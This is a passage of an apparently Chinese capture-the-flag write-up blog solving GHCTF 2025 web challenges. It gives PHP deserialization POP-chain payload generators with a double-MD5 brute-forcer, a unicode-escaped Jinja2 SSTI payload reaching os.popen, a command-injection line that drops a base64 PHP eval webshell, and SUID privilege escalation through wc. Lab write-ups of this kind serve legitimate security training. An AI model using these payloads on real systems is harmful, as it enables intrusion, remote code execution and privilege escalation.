666</code>，如果满足，返回<code>fruit10-&gt;hey</code>。需要找到<code>fruit11</code>的值使得双重MD5等于666，但看起来<code>fruit11</code>默认是”sr22kaDugamdwTPhG5zU”，可能需要覆盖它。</li></ul><ol start="8"><li><strong>UselessTwo</strong>类：</li></ol><ul><li>简单的<code>__toString()</code>，返回隐藏变量。</li></ul><ol start="9"><li><strong>Warrior</strong>类：</li></ol><ul><li><code>__set()</code>方法在设置属性时触发，可能通过<code>strtolower</code>触发其他操作。</li></ul><p>那么链尾就明了了，就是Samurai类的_get()方法</p><p>但是该如何触发这_get方法呢？</p><p><font style="color:rgb(38,38,38);">在从不可访问的属性读取数据或者不存在这个键都会调⽤ __get() ⽅法。 </font></p><p><font style="color:rgb(38,38,38);">此时我们发现在 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">Philosopher</font><font style="color:rgb(38,38,38);"> 这个类中存在访问不存在的键值 key 这个操作，⾃然就会触发 _ </font></p><p><font style="color:rgb(38,38,38);">_</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">get(</font><font style="color:rgb(38,38,38);">) 函数</font></p><p><img src="1742031281304-2487266d-0f2b-4338-ae73-f4e4a808f0fa.png" loading="lazy"></p><p><font style="color:rgb(38,38,38);">我们发现该函数是魔术魔⽅ </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__invoke()</font><font style="color:rgb(38,38,38);"> ；那么我们就继续想如何才能触发这个</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;"> __invoke()</font><font style="color:rgb(38,38,38);"> 函数 </font></p><p><font style="color:rgb(38,38,38);">呢？当尝试将对象调⽤为函数时触发 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__invoke()</font><font style="color:rgb(38,38,38);"> 。所以此时我们就需要寻找有哪个对象被当作函数 </font></p><p><font style="color:rgb(38,38,38);">进⾏调⽤了。 </font></p><p><font style="color:rgb(38,38,38);">我们继续进⾏源码审计发现在 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">Warlord</font><font style="color:rgb(38,38,38);"> 这个类中出现了将对象调⽤为函数的操作：</font></p><p><img src="1742031305284-a6979849-3d9e-4527-9819-96775689e1f3.png" loading="lazy"></p><p><font style="color:rgb(38,38,38);">我们观察到该函数为魔术魔⽅</font><font style="color:rgb(38,38,38);background-color:#D8DAD9;"> _call() </font><font style="color:rgb(38,38,38);">；那么我们就继续想如何才能触发这个 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> ；在对象 </font></p><p><font style="color:rgb(38,38,38);">上下⽂中调⽤不可访问的⽅法或不存在的⽅法时触发 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> 。 </font></p><p><font style="color:rgb(89,89,89);">34</font><font style="color:rgb(38,38,38);">再接着源码审计可以看到在 Samurai 这个类中出现了不可访问的⽅法 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">add()</font><font style="color:rgb(38,38,38);"> ；此时⾃然就会触 </font></p><p><font style="color:rgb(38,38,38);">发 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> 函数。</font></p><p><img src="1742031448186-1a669cac-ae88-40ac-a827-ad32cc1ed2e6.png" loading="lazy"></p><p>我们观察到该函数为魔术魔⽅ __toString() ；那么我们就继续想如何才能触发这个 __toString</p><p>() 函数呢？在将对象当作字符串使⽤时就会触发 __toString（） ；所以此时我们就需要寻找有哪个</p><p>对象被当作字符串进⾏调⽤了。</p><p>继续审计发现在 CherryBlossom 类中出现了将对象 fruit1 当作字符串进⾏使⽤的操作</p><p><img src="1742031483342-cd42b4ab-acdb-4345-a057-9801056265e0.png" loading="lazy"></p><p><font style="color:rgb(38,38,38);">⾄此整条pop链已经⾮常的清晰了</font></p><pre><code class="language-php">__destruct -&gt; __toString -&gt; __call -&gt;__invoke() -&gt;__get</code></pre><p><font style="color:rgb(38,38,38);">也就是</font></p><pre><code class="language-php">CherryBlossom&#123;__destruct()&#125; --&gt; Samurai&#123;__toString()&#125; --&gt; Warlord&#123;__call()&#125; --&gt; Philosopher&#123;__invoke()&#125; --&gt; Mystery&#123;__get()&#125;</code></pre><p><font style="color:rgb(38,38,38);">但是此时我们发现要实现这⼀整条 pop 链还有⼀步没有绕过；我们发现在最后⼀步 </font><font style="color:rgb(38,38,38);">__get() </font><font style="color:rgb(38,38,38);">函数的触 </font></p><p><font style="color:rgb(38,38,38);">发时需要满⾜。</font></p><pre><code class="language-php">public function __invoke() &#123;       if (md5(md5($this-&gt;fruit11)) == 666) &#123;           return $this-&gt;fruit10-&gt;hey;       &#125; &#125;</code></pre><h3 id="双重MD5"><a href="#双重MD5" class="headerlink" title="双重MD5"></a>双重MD5</h3><p><font style="color:rgb(38,38,38);">此时利⽤到的是双重md5绕过： </font></p><pre><code class="language-python"># -*- coding: utf-8 -*-# 运⾏: python2 md5.py &quot;666&quot; 0import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.ascii_letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20):    global CHARS    while not stop_event.is_set():        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))    md5 = hashlib.md5(rnds)    value = md5.hexdigest()    if value[start: start + str_len] == substr:        # print rnds        # stop_event.set()    # 碰撞双md5        md5 = hashlib.md5(value)    if md5.hexdigest()[start: start + str_len] == substr:        print rnds + &quot;=&gt;&quot; + value + &quot;=&gt;&quot; + md5.hexdigest() + &quot;\n&quot;    stop_event.set()if __name__ == &#39;__main__&#39;:    substr = sys.argv[1].strip()    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0    str_len = len(substr)    cpus = multiprocessing.cpu_count()    stop_event = multiprocessing.Event()    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,                                                               stop_event,                                                               str_len, start_pos))                 for i in range(cpus)]    for p in processes:        p.start()    for p in processes:        p.join()</code></pre><h3 id="反序列化之遍历⽂件⽬录类"><a href="#反序列化之遍历⽂件⽬录类" class="headerlink" title="反序列化之遍历⽂件⽬录类"></a>反序列化之遍历⽂件⽬录类</h3><pre><code class="language-php">&lt;?php  error_reporting(0);class CherryBlossom&#123;  public $fruit1;  public $fruit2;  function __destruct()  &#123;    echo $this-&gt;fruit1;  &#125;  public function __toString()  &#123;    $newFunc = $this-&gt;fruit2;    return $newFunc();  &#125;&#125;class Mystery&#123;  public $GlobIterator=&quot;/*&quot;;  public function __get($arg1)  &#123;    array_walk($this, function ($day1, $day2) &#123;      $day3 = new $day2($day1);      foreach ($day3 as $day4) &#123;        echo($day4 . &#39;&lt;br&gt;&#39;);      &#125;    &#125;);  &#125;&#125;class Philosopher&#123;  public $fruit10;public $fruit11=&quot;rSYwGEnSLmJWWqkEARJp&quot;;public function __invoke()  &#123;    if (md5(md5($this-&gt;fruit11)) == 666) &#123;      return $this-&gt;fruit10-&gt;hey;    &#125;  &#125;&#125;$b=new CherryBlossom();$b-&gt;fruit1=new CherryBlossom();$b-&gt;fruit1-&gt;fruit2=new Philosopher();$b-&gt;fruit1-&gt;fruit2-&gt;fruit10=new Mystery();$c=serialize($b);echo $c;</code></pre><p><img src="1742031823033-c13c1bc4-6f2d-47eb-987a-7686d5fdf237.png" loading="lazy"></p><p><img src="1741762974733-00c8656f-211f-4f06-b422-88175970fc47.png" loading="lazy"></p><p>爆出了flag的位置</p><h3 id="反序列化之读取⽂件类"><a href="#反序列化之读取⽂件类" class="headerlink" title="反序列化之读取⽂件类"></a>反序列化之读取⽂件类</h3><p><font style="color:rgb(38,38,38);">此时成功遍历⽂件⽬录后我们直接读取⽂件即可</font></p><pre><code class="language-php">&lt;?php  error_reporting(0);class CherryBlossom&#123;  public $fruit1;  public $fruit2;  function __destruct()  &#123;    echo $this-&gt;fruit1;  &#125;  public function __toString()  &#123;    $newFunc = $this-&gt;fruit2;    return $newFunc();  &#125;&#125;class Mystery&#123;  public $SplFileObject=&quot;/flag44545615441084&quot;;  public function __get($arg1)  &#123;    array_walk($this, function ($day1, $day2) &#123;      $day3 = new $day2($day1);      foreach ($day3 as $day4) &#123;        echo($day4 . &#39;&lt;br&gt;&#39;);      &#125;    &#125;);  &#125;&#125;class Philosopher&#123;  public $fruit10;     public $fruit11=&quot;rSYwGEnSLmJWWqkEARJp&quot;;public function __invoke()  &#123;    if (md5(md5($this-&gt;fruit11)) == 666) &#123;      return $this-&gt;fruit10-&gt;hey;    &#125;  &#125;&#125;$b=new CherryBlossom();$b-&gt;fruit1=new CherryBlossom();$b-&gt;fruit1-&gt;fruit2=new Philosopher();$b-&gt;fruit1-&gt;fruit2-&gt;fruit10=new Mystery();$c=serialize($b);echo $c;</code></pre><p><img src="1741763706926-5a0492d4-930b-49b8-a737-89c8c70110bd.png" loading="lazy"></p><h1 id="GHCTF-2025-upload-SSTI"><a href="#GHCTF-2025-upload-SSTI" class="headerlink" title="[GHCTF 2025]upload?SSTI!"></a>[GHCTF 2025]upload?SSTI!</h1><h2 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://www.nssctf.cn/problem/6529">https://www.nssctf.cn/problem/6529</a></p><h2 id="题解（wp）-2"><a href="#题解（wp）-2" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p><font style="color:rgb(82, 95, 127);">#</font><font style="color:rgb(82, 95, 127);"> </font><font style="color:rgb(82, 95, 127);">upload?SSTI!</font></p><pre><code class="language-python">import osimport refrom flask import Flask, request, jsonify,render_template_string,send_from_directory, abort,redirectfrom werkzeug.utils import secure_filenameimport osfrom werkzeug.utils import secure_filenameapp = Flask(__name__)# 配置信息UPLOAD_FOLDER = &#39;static/uploads&#39;  # 上传文件保存目录ALLOWED_EXTENSIONS = &#123;&#39;txt&#39;, &#39;log&#39;, &#39;text&#39;,&#39;md&#39;,&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;&#125;MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 限制上传大小为 16MBapp.config[&#39;UPLOAD_FOLDER&#39;] = UPLOAD_FOLDERapp.config[&#39;MAX_CONTENT_LENGTH&#39;] = MAX_CONTENT_LENGTH# 创建上传目录（如果不存在）os.makedirs(UPLOAD_FOLDER, exist_ok=True)def is_safe_path(basedir, path):    return os.path.commonpath([basedir,path])def contains_dangerous_keywords(file_path):    dangerous_keywords = [&#39;_&#39;, &#39;os&#39;, &#39;subclasses&#39;, &#39;__builtins__&#39;, &#39;__globals__&#39;,&#39;flag&#39;,]    with open(file_path, &#39;rb&#39;) as f:        file_content = str(f.read())        for keyword in dangerous_keywords:            if keyword in file_content:                return True  # 找到危险关键字，返回 True    return False  # 文件内容中没有危险关键字def allowed_file(filename):    return &#39;.&#39; in filename and \    filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def upload_file():    if request.method == &#39;POST&#39;:        # 检查是否有文件被上传        if &#39;file&#39; not in request.files:            return jsonify(&#123;&quot;error&quot;: &quot;未上传文件&quot;&#125;), 400        file = request.files[&#39;file&#39;]        # 检查是否选择了文件        if file.filename == &#39;&#39;:            return jsonify(&#123;&quot;error&quot;: &quot;请选择文件&quot;&#125;), 400        # 验证文件名和扩展名        if file and allowed_file(file.filename):            # 安全处理文件名            filename = secure_filename(file.filename)            # 保存文件            save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)            file.save(save_path)            # 返回文件路径（绝对路径）            return jsonify(&#123;                &quot;message&quot;: &quot;File uploaded successfully&quot;,                &quot;path&quot;: os.path.abspath(save_path)            &#125;), 200        else:            return jsonify(&#123;&quot;error&quot;: &quot;文件类型错误&quot;&#125;), 400    # GET 请求显示上传表单（可选）    return &#39;&#39;&#39;    &lt;!doctype html&gt;    &lt;title&gt;Upload File&lt;/title&gt;    &lt;h1&gt;Upload File&lt;/h1&gt;    &lt;form method=post enctype=multipart/form-data&gt;      &lt;input type=file name=file&gt;      &lt;input type=submit value=Upload&gt;    &lt;/form&gt;    &#39;&#39;&#39;@app.route(&#39;/file/&lt;path:filename&gt;&#39;)def view_file(filename):    try:        # 1. 过滤文件名        safe_filename = secure_filename(filename)        if not safe_filename:            abort(400, description=&quot;无效文件名&quot;)        # 2. 构造完整路径        file_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], safe_filename)        # 3. 路径安全检查        if not is_safe_path(app.config[&#39;UPLOAD_FOLDER&#39;], file_path):            abort(403, description=&quot;禁止访问的路径&quot;)        # 4. 检查文件是否存在        if not os.path.isfile(file_path):            abort(404, description=&quot;文件不存在&quot;)        suffix=os.path.splitext(filename)[1]        print(suffix)        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#39;image/jpeg&#39;)        if contains_dangerous_keywords(file_path):            # 删除不安全的文件            os.remove(file_path)            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400        with open(file_path, &#39;rb&#39;) as f:            file_data = f.read().decode(&#39;utf-8&#39;)        tmp_str = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;        &lt;html lang=&quot;zh&quot;&gt;        &lt;head&gt;            &lt;meta charset=&quot;UTF-8&quot;&gt;            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;            &lt;title&gt;查看文件内容&lt;/title&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;            &lt;footer&gt;                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;            &lt;/footer&gt;        &lt;/body&gt;        &lt;/html&gt;        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)        return render_template_string(tmp_str)    except Exception as e:        app.logger.error(f&quot;文件查看失败: &#123;str(e)&#125;&quot;)        abort(500, description=&quot;文件查看失败:&#123;&#125; &quot;.format(str(e)))# 错误处理（可选）@app.errorhandler(404)def not_found(error):    return &#123;&quot;error&quot;: error.description&#125;, 404@app.errorhandler(403)def forbidden(error):    return &#123;&quot;error&quot;: error.description&#125;, 403if __name__ == &#39;__main__&#39;:    app.run(&quot;0.0.0.0&quot;,debug=False)</code></pre><p><font style="color:rgb(82, 95, 127);">下载附件，发现是源码，开始代码审计</font></p><p><font style="color:rgb(82, 95, 127);">审完发现，重点在于这一块</font></p><pre><code class="language-python">@app.route(&#39;/file/&lt;path:filename&gt;&#39;)def view_file(filename):    try:        # 1. 过滤文件名        safe_filename = secure_filename(filename)        if not safe_filename:            abort(400, description=&quot;无效文件名&quot;)        # 2. 构造完整路径        file_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], safe_filename)        # 3. 路径安全检查        if not is_safe_path(app.config[&#39;UPLOAD_FOLDER&#39;], file_path):            abort(403, description=&quot;禁止访问的路径&quot;)        # 4. 检查文件是否存在        if not os.path.isfile(file_path):            abort(404, description=&quot;文件不存在&quot;)        suffix=os.path.splitext(filename)[1]        print(suffix)        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#39;image/jpeg&#39;)        if contains_dangerous_keywords(file_path):            # 删除不安全的文件            os.remove(file_path)            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400</code></pre><p><font style="color:rgb(82, 95, 127);">在 &#x2F;file 下才能触发上传文件，还发现有关键词过滤</font></p><pre><code class="language-python">def contains_dangerous_keywords(file_path):    dangerous_keywords = [&#39;_&#39;, &#39;os&#39;, &#39;subclasses&#39;, &#39;__builtins__&#39;, &#39;__globals__&#39;,&#39;flag&#39;,]</code></pre><p>简单的关键词过滤，字符串拼接就能过<br>先尝试触发一下 ssti<br>payload:49<br>访问 &#x2F;file&#x2F;<filename>，成功触发 7*7，说明注入点确实在这儿</filename></p><p><img src="image-20250316161453834.png" loading="lazy"></p><p>测试一下能不能获取类</p><pre><code class="language-python">payload: &#123;&#123;’’|attr(”class”)&#125;&#125;</code></pre><p>应为下划线被过滤，所以用 | attr 代替<br>“”.<strong>class</strong> &#x3D;&#x3D; “”|attr(“class”)<br>再次访问</p><p><img src="image-20250316161808503.png" loading="lazy"></p><p>并没有回显，继续尝试 lipsum</p><pre><code class="language-python">payload : &#123;&#123;lipsum&#125;&#125;</code></pre><p><img src="image-20250316162139913.png" loading="lazy"></p><p>思路明确了，直接尝试构造<br>payload :</p><pre><code class="language-python"> &#123;&#123;lipsum|attr(”globals”).get(”os”).popen(”ls”).read()&#125;&#125;</code></pre><p>但是在过滤中不但过滤了关键词 globals 和 os 还过滤了下划线，所以我们尝试使用 unicode 编码绕过<br>所以最终 payload 为</p><pre><code class="language-python">&#123;&#123;((((lipsum|attr(“\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f”))|attr(“\u0067\u0065\u0074”)(“o””s”))|attr(“\u0070\u006f\u0070\u0065\u006e”)(“ls”))|attr(“\u0072\u0065\u0061\u0064”)())&#125;&#125;</code></pre><p><img src="image-20250316162209165.png" loading="lazy"></p><p>除了 unicode 编码外，关键字过滤还能使用字符串拼接绕过</p><pre><code class="language-python">也可以不使用+号os == &#39;o&#39;&#39;s&#39;也可以不使用+号os == &#39;o&#39;&#39;s&#39;</code></pre><h1 id="GHCTF-2025-GetShell"><a href="#GHCTF-2025-GetShell" class="headerlink" title="[GHCTF 2025]GetShell"></a>[GHCTF 2025]GetShell</h1><h2 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="http://node1.anna.nssctf.cn:28578/">http://node1.anna.nssctf.cn:28578/</a></p><h2 id="题解（wp）-3"><a href="#题解（wp）-3" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p>开启靶场，发现给了源码</p><pre><code class="language-php">&lt;?phphighlight_file(__FILE__);class ConfigLoader &#123;    private $config;    public function __construct() &#123;        $this-&gt;config = [            &#39;debug&#39; =&gt; true,            &#39;mode&#39; =&gt; &#39;production&#39;,            &#39;log_level&#39; =&gt; &#39;info&#39;,            &#39;max_input_length&#39; =&gt; 100,            &#39;min_password_length&#39; =&gt; 8,            &#39;allowed_actions&#39; =&gt; [&#39;run&#39;, &#39;debug&#39;, &#39;generate&#39;]        ];    &#125;    public function get($key) &#123;        return $this-&gt;config[$key] ?? null;    &#125;&#125;class Logger &#123;    private $logLevel;    public function __construct($logLevel) &#123;        $this-&gt;logLevel = $logLevel;    &#125;    public function log($message, $level = &#39;info&#39;) &#123;        if ($level === $this-&gt;logLevel) &#123;            echo &quot;[LOG] $message\n&quot;;        &#125;    &#125;&#125;class UserManager &#123;    private $users = [];    private $logger;    public function __construct($logger) &#123;        $this-&gt;logger = $logger;    &#125;    public function addUser($username, $password) &#123;        if (strlen($username) &lt; 5) &#123;            return &quot;Username must be at least 5 characters&quot;;        &#125;        if (strlen($password) &lt; 8) &#123;            return &quot;Password must be at least 8 characters&quot;;        &#125;        $this-&gt;users[$username] = password_hash($password, PASSWORD_BCRYPT);        $this-&gt;logger-&gt;log(&quot;User $username added&quot;);        return &quot;User $username added&quot;;    &#125;    public function authenticate($username, $password) &#123;        if (isset($this-&gt;users[$username]) &amp;&amp; password_verify($password, $this-&gt;users[$username])) &#123;            $this-&gt;logger-&gt;log(&quot;User $username authenticated&quot;);            return &quot;User $username authenticated&quot;;        &#125;        return &quot;Authentication failed&quot;;    &#125;&#125;class StringUtils &#123;    public static function sanitize($input) &#123;        return htmlspecialchars($input, ENT_QUOTES, &#39;UTF-8&#39;);    &#125;    public static function generateRandomString($length = 10) &#123;        return substr(str_shuffle(str_repeat($x = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;, ceil($length / strlen($x)))), 1, $length);    &#125;&#125;class InputValidator &#123;    private $maxLength;    public function __construct($maxLength) &#123;        $this-&gt;maxLength = $maxLength;    &#125;    public function validate($input) &#123;        if (strlen($input) &gt; $this-&gt;maxLength) &#123;            return &quot;Input exceeds maximum length of &#123;$this-&gt;maxLength&#125; characters&quot;;        &#125;        return true;    &#125;&#125;class CommandExecutor &#123;    private $logger;    public function __construct($logger) &#123;        $this-&gt;logger = $logger;    &#125;    public function execute($input) &#123;        if (strpos($input, &#39; &#39;) !== false) &#123;            $this-&gt;logger-&gt;log(&quot;Invalid input: space detected&quot;);            die(&#39;No spaces allowed&#39;);        &#125;        @exec($input, $output);        $this-&gt;logger-&gt;log(&quot;Result: $input&quot;);        return implode(&quot;\n&quot;, $output);    &#125;&#125;class ActionHandler &#123;    private $config;    private $logger;    private $executor;    public function __construct($config, $logger) &#123;        $this-&gt;config = $config;        $this-&gt;logger = $logger;        $this-&gt;executor = new CommandExecutor($logger);    &#125;    public function handle($action, $input) &#123;        if (!in_array($action, $this-&gt;config-&gt;get(&#39;allowed_actions&#39;))) &#123;            return &quot;Invalid action&quot;;        &#125;        if ($action === &#39;run&#39;) &#123;            $validator = new InputValidator($this-&gt;config-&gt;get(&#39;max_input_length&#39;));            $validationResult = $validator-&gt;validate($input);            if ($validationResult !== true) &#123;                return $validationResult;            &#125;            return $this-&gt;executor-&gt;execute($input);        &#125; elseif ($action === &#39;debug&#39;) &#123;            return &quot;Debug mode enabled&quot;;        &#125; elseif ($action === &#39;generate&#39;) &#123;            return &quot;Random string: &quot; . StringUtils::generateRandomString(15);        &#125;        return &quot;Unknown action&quot;;    &#125;&#125;if (isset($_REQUEST[&#39;action&#39;])) &#123;    $config = new ConfigLoader();    $logger = new Logger($config-&gt;get(&#39;log_level&#39;));    $actionHandler = new ActionHandler($config, $logger);    $input = $_REQUEST[&#39;input&#39;] ?? &#39;&#39;;    echo $actionHandler-&gt;handle($_REQUEST[&#39;action&#39;], $input);&#125; else &#123;    $config = new ConfigLoader();    $logger = new Logger($config-&gt;get(&#39;log_level&#39;));    $userManager = new UserManager($logger);    if (isset($_POST[&#39;register&#39;])) &#123;        $username = $_POST[&#39;username&#39;];        $password = $_POST[&#39;password&#39;];        echo $userManager-&gt;addUser($username, $password);    &#125;    if (isset($_POST[&#39;login&#39;])) &#123;        $username = $_POST[&#39;username&#39;];        $password = $_POST[&#39;password&#39;];        echo $userManager-&gt;authenticate($username, $password);    &#125;    $logger-&gt;log(&quot;No action provided, running default logic&quot;);&#125; [LOG] No action provided, running default logic</code></pre><p><font style="color:rgb(38,38,38);">命令执⾏点：此时的类名已经提示得很明显了：CommandExecutor</font></p><pre><code class="language-php">class CommandExecutor &#123;    private $logger;    public function __construct($logger) &#123;        $this-&gt;logger = $logger;    &#125;    public function execute($input) &#123;        if (strpos($input, &#39; &#39;) !== false) &#123;            $this-&gt;logger-&gt;log(&quot;Invalid input: space detected&quot;);            die(&#39;No spaces allowed&#39;);        &#125;        @exec($input, $output);        $this-&gt;logger-&gt;log(&quot;Result: $input&quot;);        return implode(&quot;\n&quot;, $output);    &#125;&#125;</code></pre><p><font style="color:rgb(38,38,38);">接下来继续审计会发现有⼀个前置条件</font></p><pre><code class="language-php">if ($action === &#39;run&#39;) &#123;            $validator = new InputValidator($this-&gt;config-&gt;get(&#39;max_input_length&#39;));            $validationResult = $validator-&gt;validate($input);            if ($validationResult !== true) &#123;                return $validationResult;            &#125;            return $this-&gt;executor-&gt;execute($input);</code></pre><p><font style="color:rgb(38,38,38);">只有当action&#x3D;run的情况下才会执⾏。那这就很好构造了：</font></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a><font style="color:rgb(38,38,38);">getshell</font></h3><pre><code class="language-php">?action=run&amp;input=echo%09PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8%2b|base64%09-d%3Eshell.php</code></pre><p><img src="1742110248326-9029419c-b8df-4dcf-b73c-d4e59cc6897b.png" loading="lazy"></p><p><img src="1742110292105-889ffac7-3f93-451c-8da9-aedc7d20faa9.png" loading="lazy"></p><p>直接蚁剑连接</p><p><img src="1742110415741-d0664a5d-c56f-4588-a008-656b40c253f0.png" loading="lazy"></p><p><img src="1742110458398-dde4091b-f7a1-4922-8ada-d188362e9f59.png" loading="lazy"></p><p>尝试读取flag</p><p><img src="1742110533854-eb00a2e2-7b37-4e26-b311-3c8f6c535939.png" loading="lazy"></p><p>打开发现什么都没有！！！！</p><p>😱😱😱</p><p>明明有大小打开却发现什么都没有</p><p>《flag失踪案》</p><p>真相只有一个🕵️</p><p>回到根目录，有一个docker的配置文件</p><p><img src="1742110684450-de6eb184-da12-4bd8-823b-30e4b3192f47.png" loading="lazy"></p><pre><code class="language-shell">#!/bin/sh# Get the useruser=$(ls /home)# Check the environment variables for the flag and assign to INSERT_FLAG# 需要注意，以下语句会将FLAG相关传递变量进行覆盖，如果需要，请注意修改相关操作if [ &quot;$DASFLAG&quot; ]; then    INSERT_FLAG=&quot;$DASFLAG&quot;    export DASFLAG=no_FLAG    DASFLAG=no_FLAGelif [ &quot;$FLAG&quot; ]; then    INSERT_FLAG=&quot;$FLAG&quot;    export FLAG=no_FLAG    FLAG=no_FLAGelif [ &quot;$GZCTF_FLAG&quot; ]; then    INSERT_FLAG=&quot;$GZCTF_FLAG&quot;    export GZCTF_FLAG=no_FLAG    GZCTF_FLAG=no_FLAGelse    INSERT_FLAG=&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;fi# 将FLAG写入文件 请根据需要修改echo $INSERT_FLAG | tee /flagchmod 700 /flagexec apache2-foreground</code></pre><p>注意这一行</p><p>chmod 700 &#x2F;flag</p><p>它的作用是确保只有文件所有者（如root）可读写，阻止其他用户或服务（如Apache的<code>www-data</code>用户）直接访问。</p><p>那就很明了了，直接提权便是</p><h3 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a><font style="color:rgb(38,38,38);">Suid提权</font></h3><p><font style="color:rgb(38,38,38);">所谓suid就是，你本来是www-data的权限，但是当你执⾏有 </font></p><p><font style="color:rgb(38,38,38);">suid权限的⽂件时，你会暂时拥有这⽂件所有者的权限（⽐如root）。</font></p><p><font style="color:rgb(38,38,38);">关于Suid提权的文章</font></p><p><a href="https://xz.aliyun.com/news/11981">https://xz.aliyun.com/news/11981</a></p><p><img src="1742111741730-fafc41ac-9272-443a-9203-9f2f17a202e4.png" loading="lazy"></p><pre><code class="language-shell">find / -user root -perm -4000 -print 2&gt;/dev/nullresult:(www-data:/var/www/html) $ find / -user root -perm -4000 -print 2&gt;/dev/null/var/www/html/wc/bin/umount/bin/mount/bin/su/usr/bin/newgrp/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/chsh</code></pre><p><font style="color:rgb(38,38,38);">有一个wc文件有点可疑</font></p><p><font style="color:rgb(38,38,38);">去找找这个文件是否能提权</font></p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p><img src="1742111901549-6bbd1783-e9c8-42e1-8f45-ccddc2985221.png" loading="lazy"></p><p>可以进行提权，按照文档来做</p><p><a href="https://gtfobins.github.io/gtfobins/wc/#suid">https://gtfobins.github.io/gtfobins/wc/#suid</a></p><p><img src="1742111988479-affd37b8-8c6e-4f71-839f-88123bdc9cb0.png" loading="lazy"></p><pre><code class="language-shell">/var/www/html/wc --files0-from &quot;$LFILE&quot;</code></pre><p><img src="1742112064301-cd58df66-eda2-4bd0-97c5-18c715ab6aca.png" loading="lazy"></p><p>解出flag</p><h1 id="GHCTF-2025-Escape！"><a href="#GHCTF-2025-Escape！" class="headerlink" title="[GHCTF 2025]Escape！"></a>[GHCTF 2025]Escape！</h1><h2 id="题目链接-6"><a href="#题目链接-6" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://www.nssctf.cn/problem/6537">https://www.nssctf.cn/problem/6537</a></p><h2 id="题解（wp）-4"><a href="#题解（wp）-4" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p><img src="1742522958050-224f8bd1-5f7b-475b-a022-3ed96e72432a.png" loading="lazy"></p><p>题目给了源码</p><p><img src="1742523019194-a1946d0b-5721-4313-b9ec-ca309bcaa15d.png" loading="lazy"></p><p>源码🤢🤢🤢🤢！！！！</p><p>dashboard.php</p><pre><code class="language-php">&lt;?phpini_set(&#39;display_errors&#39;, 0);error_reporting(0);include &quot;class.php&quot;;function checkSignedCookie($cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretkey&#39;) &#123;    // 获取 Cookie 内容    if (isset($_COOKIE[$cookieName])) &#123;        $token = $_COOKIE[$cookieName];        // 解码并分割数据和签名        $decodedToken = base64_decode($token);        list($serializedData, $providedSignature) = explode(&#39;|&#39;, $decodedToken);        // 重新计算签名        $calculatedSignature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);        // 比较签名是否一致        if ($calculatedSignature === $providedSignature) &#123;            // 签名验证通过，返回序列化的数据            return $serializedData;  // 反序列化数据        &#125; else &#123;            // 签名验证失败            return false;        &#125;    &#125;    return false;  // 如果没有 Cookie&#125;// 示例：验证并读取 Cookie$userData = checkSignedCookie();if ($userData) &#123;    #echo $userData;    $user=unserialize($userData);    #var_dump($user);    if($user-&gt;isadmin)&#123;        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);        echo $tmp;        if($_POST[&#39;txt&#39;]) &#123;        $content = &#39;&lt;?php exit; ?&gt;&#39;;$content .= $_POST[&#39;txt&#39;];file_put_contents($_POST[&#39;filename&#39;], $content);        &#125;    &#125;    else&#123;        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);        echo $tmp;    